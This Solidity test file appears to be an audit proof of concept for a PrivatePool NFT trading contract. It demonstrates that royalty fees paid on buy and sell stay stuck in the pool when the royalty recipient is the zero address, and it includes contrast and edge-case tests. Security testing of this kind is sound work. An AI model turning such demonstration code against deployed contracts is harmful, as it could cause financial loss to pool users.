// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../../test/Fixture.sol";
import "../../src/PrivatePool.sol";
import "solmate/tokens/ERC721.sol";
import "openzeppelin/token/common/ERC2981.sol";

// Test NFT contract that allows setting royalty recipient to zero address
contract TestNFT is ERC721, ERC2981 {
    uint256 public royaltyFeeRate = 0;
    address public royaltyRecipient = address(0xbeefbeef);

    constructor() ERC721("Test NFT", "TEST") {}

    function tokenURI(uint256) public view virtual override returns (string memory) {
        return "https://test.com";
    }

    function mint(address to, uint256 id) public {
        _mint(to, id);
    }

    function setRoyaltyInfo(uint256 _royaltyFeeRate, address _royaltyRecipient) public {
        royaltyFeeRate = _royaltyFeeRate;
        royaltyRecipient = _royaltyRecipient;
    }

    function supportsInterface(bytes4 interfaceId) public view override(ERC2981, ERC721) returns (bool) {
        return super.supportsInterface(interfaceId);
    }

    function royaltyInfo(uint256, uint256 salePrice) public view override returns (address, uint256) {
        return (royaltyRecipient, salePrice * royaltyFeeRate / 1e18);
    }
}

/**
 * @title Exploit Test for Royalty Loss Vulnerability
 * @dev This test demonstrates the vulnerability where buyers/sellers pay royalty fees
 * that are never distributed when the royalty recipient is address(0)
 *
 * Vulnerability Analysis:
 * 1. In buy() function: royaltyFeeAmount accumulates ALL royalty fees regardless of recipient
 * 2. netInputAmount is increased by royaltyFeeAmount, so buyer pays the full amount
 * 3. During distribution: royalties only transferred if recipient != address(0)
 * 4. Result: Buyer pays fees that stay in pool contract when recipient is zero address
 *
 * Same issue exists in sell() function where seller receives less output but
 * royalties with zero recipient are not distributed.
 */
contract ExploitTest is Fixture {
    PrivatePool public privatePool;
    TestNFT public testNFT;

    // Test configuration
    address baseToken = address(0); // ETH
    address nft;
    uint128 virtualBaseTokenReserves = 100e18;
    uint128 virtualNftReserves = 5e18;
    uint16 feeRate = 0;
    uint56 changeFee = 0;
    bytes32 merkleRoot = bytes32(0);

    // Exploit parameters
    uint256 royaltyFeeRate = 0.1e18; // 10% royalty rate
    address zeroRecipient = address(0); // Zero address recipient
    uint256 exploitNftId = 1;

    uint256[] tokenIds;
    uint256[] tokenWeights;
    PrivatePool.MerkleMultiProof proofs;

    function setUp() public {
        // Deploy test NFT
        testNFT = new TestNFT();
        nft = address(testNFT);

        // Create pool through Factory to get proper ownership
        uint256[] memory depositTokenIds = new uint256[](1);
        depositTokenIds[0] = exploitNftId;

        // Mint NFT to this contract first so it can be deposited
        testNFT.mint(address(this), exploitNftId);

        // Approve factory to transfer the NFT
        testNFT.approve(address(factory), exploitNftId);

        // Create pool with NFT deposit
        privatePool = factory.create{value: 1e18}(
            baseToken,
            nft,
            virtualBaseTokenReserves,
            virtualNftReserves,
            changeFee,
            feeRate,
            merkleRoot,
            true, // useStolenNftOracle
            true, // payRoyalties - CRITICAL for vulnerability
            bytes32(0), // salt
            depositTokenIds,
            1e18 // base token amount
        );

        // Set up token arrays for buy/sell operations
        tokenIds.push(exploitNftId);
        // tokenWeights remains empty (default weight = 1e18 when merkleRoot = 0)
    }

    /**
     * @dev Test the vulnerability in the buy() function
     * Demonstrates that buyer pays royalty fees that are never distributed
     * when royalty recipient is address(0)
     */
    function test_BuyRoyaltyLossWhenRecipientIsZeroAddress() public {
        // Step 1: Set up NFT with royalty that returns zero address as recipient
        // This simulates a misconfigured NFT contract or malicious royalty setup
        testNFT.setRoyaltyInfo(royaltyFeeRate, zeroRecipient);

        // Step 2: Calculate expected costs
        (uint256 netInputAmount, uint256 feeAmount, uint256 protocolFeeAmount) =
            privatePool.buyQuote(1e18); // 1 NFT weight

        // Calculate expected royalty fee (10% of the sale price)
        uint256 salePrice = (netInputAmount - feeAmount - protocolFeeAmount);
        uint256 expectedRoyaltyFee = salePrice * royaltyFeeRate / 1e18;

        // Step 3: Record balances before the exploit
        uint256 buyerBalanceBefore = address(this).balance;
        uint256 poolBalanceBefore = address(privatePool).balance;

        // Step 4: Execute the vulnerable buy operation
        // The buyer will pay the royalty fee even though recipient is zero address
        privatePool.buy{value: netInputAmount + expectedRoyaltyFee}(tokenIds, tokenWeights, proofs);

        // Step 5: Verify the vulnerability occurred
        uint256 buyerBalanceAfter = address(this).balance;
        uint256 poolBalanceAfter = address(privatePool).balance;

        // Assertions to prove the vulnerability
        assertEq(
            buyerBalanceBefore - buyerBalanceAfter,
            netInputAmount + expectedRoyaltyFee,
            "Buyer should have paid the royalty fee"
        );

        assertEq(
            poolBalanceAfter - poolBalanceBefore,
            netInputAmount + expectedRoyaltyFee,
            "Pool should have received the royalty fee"
        );

        assertEq(zeroRecipient.balance, 0, "Zero address recipient should not have received any royalty");

        assertGt(expectedRoyaltyFee, 0, "Royalty fee should be greater than zero");

        // The key vulnerability: buyer paid royalty fee but it stayed in pool
        assertEq(
            poolBalanceAfter - poolBalanceBefore - netInputAmount,
            expectedRoyaltyFee,
            "Royalty fee should be stuck in pool contract"
        );
    }

    /**
     * @dev Test the vulnerability in the sell() function
     * Demonstrates that seller receives less output due to royalty fees
     * that are never distributed when royalty recipient is address(0)
     */
    function test_SellRoyaltyLossWhenRecipientIsZeroAddress() public {
        // Step 1: Set up NFT with royalty that returns zero address as recipient
        testNFT.setRoyaltyInfo(royaltyFeeRate, zeroRecipient);

        // Step 2: Buy the NFT first so we can sell it back
        (uint256 buyNetInputAmount, uint256 buyFeeAmount, uint256 buyProtocolFeeAmount) =
            privatePool.buyQuote(1e18);
        uint256 buySalePrice = (buyNetInputAmount - buyFeeAmount - buyProtocolFeeAmount);
        uint256 buyRoyaltyFee = buySalePrice * royaltyFeeRate / 1e18;

        privatePool.buy{value: buyNetInputAmount + buyRoyaltyFee}(tokenIds, tokenWeights, proofs);

        // Approve pool to transfer NFT back for sell
        testNFT.approve(address(privatePool), exploitNftId);

        // Step 3: Calculate expected outputs for sell
        (uint256 netOutputAmount, uint256 feeAmount, uint256 protocolFeeAmount) =
            privatePool.sellQuote(1e18); // 1 NFT weight

        // Calculate expected royalty fee (10% of the sale price)
        uint256 salePrice = (netOutputAmount + feeAmount + protocolFeeAmount);
        uint256 expectedRoyaltyFee = salePrice * royaltyFeeRate / 1e18;

        // Step 4: Record balances before the exploit
        uint256 sellerBalanceBefore = address(this).balance;
        uint256 poolBalanceBefore = address(privatePool).balance;

        // Step 5: Execute the vulnerable sell operation
        // The seller will receive less output due to royalty fee deduction
        // but the royalty fee won't be distributed to zero address recipient
        privatePool.sell(tokenIds, tokenWeights, proofs, new IStolenNftOracle.Message[](0));

        // Step 6: Verify the vulnerability occurred
        uint256 sellerBalanceAfter = address(this).balance;
        uint256 poolBalanceAfter = address(privatePool).balance;

        // Assertions to prove the vulnerability
        assertEq(
            sellerBalanceAfter - sellerBalanceBefore,
            netOutputAmount - expectedRoyaltyFee,
            "Seller should receive less due to royalty fee"
        );

        assertEq(zeroRecipient.balance, 0, "Zero address recipient should not have received any royalty");

        assertGt(expectedRoyaltyFee, 0, "Royalty fee should be greater than zero");

        // The key vulnerability: royalty fee was deducted from seller's output
        // but never distributed to anyone (stays in pool)
        assertEq(
            poolBalanceBefore - poolBalanceAfter,
            netOutputAmount - expectedRoyaltyFee,
            "Pool should retain the undistributed royalty fee"
        );
    }

    /**
     * @dev Test that demonstrates the contrast: when recipient is valid,
     * royalties are properly distributed (no vulnerability)
     */
    function test_NoRoyaltyLossWhenRecipientIsValid() public {
        // Step 1: Set up NFT with valid royalty recipient
        address validRecipient = address(0xdeadbeef);
        testNFT.setRoyaltyInfo(royaltyFeeRate, validRecipient);

        // Step 2: Fund the valid recipient to verify it receives royalties
        vm.deal(validRecipient, 0);

        // Step 3: Calculate expected costs
        (uint256 netInputAmount, uint256 feeAmount, uint256 protocolFeeAmount) =
            privatePool.buyQuote(1e18);

        uint256 salePrice = (netInputAmount - feeAmount - protocolFeeAmount);
        uint256 expectedRoyaltyFee = salePrice * royaltyFeeRate / 1e18;

        // Step 4: Record balances before the operation
        uint256 validRecipientBalanceBefore = validRecipient.balance;

        // Step 5: Execute buy operation
        privatePool.buy{value: netInputAmount + expectedRoyaltyFee}(tokenIds, tokenWeights, proofs);

        // Step 6: Verify proper royalty distribution
        uint256 validRecipientBalanceAfter = validRecipient.balance;

        assertEq(
            validRecipientBalanceAfter - validRecipientBalanceBefore,
            expectedRoyaltyFee,
            "Valid recipient should receive the royalty fee"
        );
    }

    /**
     * @dev Edge case test: zero royalty fee rate should not cause issues
     */
    function test_NoRoyaltyLossWhenRoyaltyFeeIsZero() public {
        // Step 1: Set up NFT with zero royalty fee rate
        testNFT.setRoyaltyInfo(0, zeroRecipient);

        // Step 2: Calculate expected costs
        (uint256 netInputAmount, uint256 feeAmount, uint256 protocolFeeAmount) =
            privatePool.buyQuote(1e18);

        // Step 3: Execute buy operation
        privatePool.buy{value: netInputAmount}(tokenIds, tokenWeights, proofs);

        // Step 4: Verify no royalty was charged or expected
        // This should pass without issues since royalty fee is zero
        assertTrue(true, "No royalty fee should be charged when rate is zero");
    }
}